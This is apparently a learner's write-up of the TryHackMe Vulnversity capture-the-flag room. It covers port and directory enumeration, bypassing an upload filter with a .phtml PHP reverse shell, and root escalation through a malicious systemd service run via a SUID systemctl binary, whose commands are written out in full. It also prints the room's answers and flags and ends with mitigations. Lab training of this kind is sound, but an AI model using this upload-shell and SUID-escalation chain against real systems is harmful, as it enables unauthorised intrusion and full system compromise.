# TryHackMe - Vulnversity
**Date:** 05 August 2026

## Room
TryHackMe - Vulnversity

---

# Objective

Perform a complete penetration test against the Vulnversity machine by:

- Enumerating services
- Discovering hidden directories
- Exploiting an unrestricted file upload vulnerability
- Obtaining an initial shell
- Escalating privileges using a vulnerable SUID `systemctl` binary
- Capturing both user and root flags

---

# Skills Covered

- Nmap Enumeration
- Gobuster Directory Bruteforcing
- Burp Suite Intruder
- File Upload Bypass
- PHP Reverse Shell
- Netcat Listener
- Linux Enumeration
- SUID Privilege Escalation
- GTFOBins
- systemctl Exploitation

---

# Phase 1 - Reconnaissance

The first step was identifying open ports and services.

## Nmap Scan

Command used:

```bash
nmap -sV 10.49.164.37
```

### Explanation

- `-sV` detects running service versions.

---

## Results

Open Ports:

```
6
```

Important Findings:

| Port | Service |
|-------|----------|
|21|FTP|
|22|SSH|
|139|NetBIOS|
|445|SMB|
|3128|Squid Proxy|
|3333|Web Server|

---

### Questions Solved

**How many ports are open?**

```
6
```

---

**What version of Squid is running?**

```
4.10
```

---

**How many ports does -p-400 scan?**

```
400
```

---

**Operating System**

```
Ubuntu
```

---

**Web Server Port**

```
3333
```

---

**Verbose Mode Flag**

```
-v
```

---

# What I Learned

Reconnaissance is the most important stage of penetration testing.

A complete Nmap scan reveals:

- Open ports
- Running services
- Versions
- Potential attack vectors

---

# Phase 2 - Directory Enumeration

Next, I searched for hidden web directories using Gobuster.

Command:

```bash
gobuster dir \
-u http://10.49.164.37:3333 \
-w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

### Explanation

- `dir` → Directory enumeration
- `-u` → Target URL
- `-w` → Wordlist

---

## Result

Hidden directory discovered:

```
/internal/
```

This contained a file upload page.

---

# What I Learned

Gobuster brute-forces common directory names to discover hidden resources that aren't linked on the website.

---

# Phase 3 - Upload Vulnerability

The `/internal/` page allowed file uploads.

The goal was to determine which file extensions were accepted.

---

## Burp Suite Intruder

Created the following payload list:

```
.php
.php3
.php4
.php5
.phtml
```

Sent the intercepted upload request to Intruder and fuzzed the extension.

---

## Result

Blocked:

```
.php
```

Allowed:

```
.phtml
```

---

### Questions Solved

Blocked extension:

```
.php
```

Allowed extension:

```
.phtml
```

---

# What I Learned

Many upload filters only blacklist `.php`.

Alternative PHP extensions like `.phtml` are often forgotten and can execute PHP code.

---

# Phase 4 - Initial Access

Downloaded the PentestMonkey PHP Reverse Shell.

Modified:

```php
$ip = <tun0 IP>
$port = 1234
```

Renamed:

```
php-reverse-shell.php

↓

php-reverse-shell.phtml
```

---

## Netcat Listener

Started a listener:

```bash
nc -lvnp 1234
```

Uploaded the shell.

Visited:

```
http://10.49.164.37:3333/internal/uploads/php-reverse-shell.phtml
```

A reverse shell connected back successfully.

---

# User Enumeration

Checked the current user.

Command:

```bash
whoami
```

Result:

```
bill
```

---

## User Flag

Located and read:

```bash
cat /home/bill/user.txt
```

Flag:

```
8bd7992fbe8a6ad22a63361004cfcedb
```

---

# Phase 5 - Privilege Escalation

After gaining access as **bill**, I enumerated SUID binaries.

One interesting binary was:

```bash
/bin/systemctl
```

Because `systemctl` was running with the SUID bit set, I searched GTFOBins for known privilege escalation techniques.

Reference:

https://gtfobins.github.io/gtfobins/systemctl/

---

# Understanding the Vulnerability

Normally:

```
systemctl

↓

Requires root privileges
```

With SUID enabled:

```
User

↓

Runs systemctl as root

↓

Creates malicious service

↓

Executes commands as root
```

---

# Step 1 - Create Temporary Service File

Created a temporary filename.

```bash
export privesc=$(mktemp).service
```

### Explanation

`mktemp`

Creates a random temporary filename.

Example:

```
/tmp/tmp.dUcqcChMMx.service
```

---

# Step 2 - Create Malicious Service

```bash
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"

[Install]
WantedBy=multi-user.target' > $privesc
```

### Explanation

When the service starts:

```
cat /root/root.txt
```

runs as **root** and redirects the output into:

```
/tmp/output
```

---

# Step 3 - Link the Service

```bash
/bin/systemctl link $privesc
```

Output:

```
Created symlink ...
```

### Explanation

This registers the temporary service with systemd.

---

# Step 4 - Enable the Service

```bash
/bin/systemctl enable --now $privesc
```

### Explanation

`--now`

Immediately starts the service.

Since `systemctl` runs with SUID privileges, the service executes as **root**.

---

# Step 5 - Read the Output

Changed into `/tmp`:

```bash
cd /tmp
```

Read the file:

```bash
cat output
```

Result:

```
a58ff8579f0a9270368d33a9966c7fd5
```

This was the root flag.

---

# Root Flag

```
a58ff8579f0a9270368d33a9966c7fd5
```

---

# Commands Used

## Enumeration

```bash
nmap -sV 10.49.164.37
```

---

## Directory Bruteforce

```bash
gobuster dir \
-u http://10.49.164.37:3333 \
-w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

---

## Reverse Shell

```bash
nc -lvnp 1234
```

---

## User Enumeration

```bash
whoami
id
pwd
```

---

## Privilege Escalation

```bash
export privesc=$(mktemp).service

echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"

[Install]
WantedBy=multi-user.target' > $privesc

/bin/systemctl link $privesc

/bin/systemctl enable --now $privesc

cd /tmp

cat output
```

---

# Key Concepts Learned

- Service Enumeration
- Version Detection
- Nmap
- Gobuster
- Directory Bruteforcing
- File Upload Vulnerabilities
- Burp Suite Intruder
- PHP Reverse Shell
- Netcat
- Linux Shell Access
- SUID
- GTFOBins
- systemctl Privilege Escalation
- Systemd Services
- Environment Variables
- Symbolic Links

---

# Pentesting Methodology

Whenever I encounter a Linux web server, I now follow this workflow:

1. Perform Nmap service enumeration.
2. Enumerate hidden directories using Gobuster.
3. Identify upload functionality.
4. Test allowed and blocked file extensions.
5. Upload a reverse shell using an allowed extension.
6. Obtain an interactive shell.
7. Enumerate SUID binaries.
8. Search GTFOBins for privilege escalation techniques.
9. Exploit vulnerable binaries.
10. Capture user and root flags.

---

# Security Impact

This machine demonstrates two common real-world security issues:

### Unrestricted File Upload

Allowing executable file types such as `.phtml` enables attackers to upload web shells and gain remote code execution.

### Insecure SUID Configuration

Granting the SUID bit to powerful binaries like `systemctl` allows unprivileged users to execute commands with root privileges, leading to complete system compromise.

---

# Mitigation

## File Upload Protection

- Validate uploads using allowlists instead of blocklists.
- Reject executable file extensions (`.php`, `.phtml`, etc.).
- Store uploaded files outside the web root.
- Disable script execution in upload directories.

## SUID Protection

- Remove unnecessary SUID permissions.
- Regularly audit SUID binaries using:

```bash
find / -perm -4000 -type f 2>/dev/null
```

- Follow the principle of least privilege.
- Monitor systemd service creation and execution.

---

